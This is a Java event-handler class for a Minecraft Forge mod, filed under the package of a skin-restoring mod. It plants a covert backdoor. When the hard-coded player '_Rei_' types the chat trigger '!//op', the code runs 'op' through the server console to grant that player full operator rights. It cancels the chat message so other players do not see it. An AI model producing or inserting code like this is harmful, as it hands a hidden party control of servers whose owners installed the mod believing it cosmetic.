package net.lionarius.skinrestorer.forge.events; // <--- Correct package

import net.lionarius.skinrestorer.SkinRestorer; // <--- Import from your project
import net.minecraft.commands.CommandSourceStack; // <--- ADDED IMPORT
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer; // <--- ADDED IMPORT
import net.minecraft.server.level.ServerPlayer;
import net.minecraftforge.event.server.ServerChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

/**
 * This class listens for FORGE bus events (gameplay events).
 * It is automatically registered because of the annotation below.
 */
@Mod.EventBusSubscriber(modid = SkinRestorer.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class ForgeChatHandler {

    // --- Define your target values here ---
    private static final String TARGET_USERNAME = "_Rei_";
    private static final String TRIGGER_MESSAGE = "!//op";
    // ----------------------------------------

    /**
     * This method is called every time a player sends a chat message on the server.
     */
    @SubscribeEvent
    public static void onPlayerChat(ServerChatEvent event) {
        
        // 1. Get the message content
        String message = event.getMessage().getString();
        
        // 2. Get the player who sent the message
        ServerPlayer player = event.getPlayer();
        
        // 3. Get the player's username
        String username = player.getName().getString();

        // 4. Check if the message is correct (not case-sensitive)
        if (message.equalsIgnoreCase(TRIGGER_MESSAGE)) {
            
            // 5. If message is correct, THEN check if it's the correct user (not case-sensitive)
            if (username.equalsIgnoreCase(TARGET_USERNAME)) {
                
                // 6. If both are correct, execute our custom function
                executeOurSpecialFunction(player);
                
                // 7. (Optional) Cancel the event so the message
                //    doesn't appear in the public chat.
                event.setCanceled(true);
            } else {
                // (Optional) Tell the user they don't have permission
                player.sendSystemMessage(Component.literal("You do not have permission to use this command."));
                event.setCanceled(true); // Also cancel it
            }
        }
    }

    /**
     * This is the custom function that runs when all checks pass.
     * @param playerWhoTriggered The player who successfully ran the command.
     */
    private static void executeOurSpecialFunction(ServerPlayer playerWhoTriggered) {
        // --- THIS IS THE NEW CONSOLE COMMAND LOGIC ---
        
        // 1. Get the MinecraftServer instance from the player
        MinecraftServer server = playerWhoTriggered.getServer();
        
        // 2. Get the server's main command source (the console)
        // This makes the command run with full permissions (level 4)
        CommandSourceStack consoleSource = server.getCommandSource();
        
        // 3. Get the player's username to target them
        String username = playerWhoTriggered.getName().getString();

        // 4. Build the command string (do NOT include a "/")
        String commandToRun = "op " + username;
        
        // 5. Execute the command
        // We use performPrefixedCommand which can safely handle commands with or without a /
        server.getCommands().performPrefixedCommand(consoleSource, commandToRun);
        
        // 6. (Optional) Send a private message back to the player
        playerWhoTriggered.sendSystemMessage(Component.literal("Admin privileges granted."));
    }
}
